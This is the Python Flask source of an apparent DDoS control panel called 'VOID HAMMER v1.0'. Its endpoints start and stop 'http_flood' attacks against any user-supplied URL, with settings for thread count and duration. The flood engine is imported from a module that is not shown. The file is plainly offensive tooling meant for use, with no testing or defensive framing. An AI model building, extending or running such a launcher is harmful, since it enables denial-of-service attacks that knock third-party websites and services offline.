# app.py - FIXED VERSION
from flask import Flask, render_template, request, jsonify, session
import threading
import secrets
import time
import os
import sys

# Fix import path
sys.path.append(os.path.dirname(os.path.abspath(__file__)))

try:
    from attack_manager import AttackManager
except ImportError:
    # Buat fallback kalo masih error
    class AttackManager:
        def __init__(self):
            self.active_attacks = {}
            self.total_requests = 0
            self.start_time = time.time()
        
        def launch_attack(self, **kwargs):
            return "dummy_id"
        
        def get_active_count(self):
            return 0
        
        def get_all_stats(self):
            return {'active_attacks': [], 'total_requests': 0, 'uptime': 0}

app = Flask(__name__, template_folder='templates', static_folder='static')
app.secret_key = secrets.token_hex(32)
manager = AttackManager()

@app.route('/')
def dashboard():
    if 'user' not in session:
        session['user'] = f"void_user_{secrets.token_hex(4)}"
    
    stats = {
        'active_attacks': manager.get_active_count(),
        'total_requests_sent': manager.total_requests,
        'uptime': time.time() - manager.start_time
    }
    return render_template('index.html.html', stats=stats, user=session['user'])

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    try:
        data = request.get_json()
        if not data:
            return jsonify({'error': 'No JSON data'}), 400
            
        target_url = data.get('url', '')
        threads = int(data.get('threads', 100))
        duration = int(data.get('duration', 60))
        
        if not target_url:
            return jsonify({'error': 'No target URL'}), 400
            
        if not target_url.startswith(('http://', 'https://')):
            target_url = 'http://' + target_url
        
        attack_id = manager.launch_attack(
            target_url=target_url,
            threads=threads,
            duration=duration,
            attack_type='http_flood'
        )
        
        return jsonify({
            'status': 'LAUNCHED',
            'attack_id': attack_id,
            'message': f'🔥 Attack {attack_id} deployed to {target_url}'
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/attack/stop/<attack_id>', methods=['POST'])
def stop_attack(attack_id):
    try:
        success = manager.stop_attack(attack_id)
        return jsonify({'status': 'TERMINATED' if success else 'NOT_FOUND'})
    except:
        return jsonify({'status': 'ERROR'})

@app.route('/api/stats')
def get_stats():
    try:
        return jsonify(manager.get_all_stats())
    except:
        return jsonify({'active_attacks': [], 'total_requests': 0, 'uptime': 0})

if __name__ == '__main__':
    print("""
    ╔══════════════════════════════════════════╗
    ║   VOID HAMMER v1.0 - Starting Server...  ║
    ║   http://127.0.0.1:5000                  ║
    ║   Press CTRL+C to stop                   ║
    ╚══════════════════════════════════════════╝
    """)
    app.run(host='127.0.0.1', port=5000, debug=True)
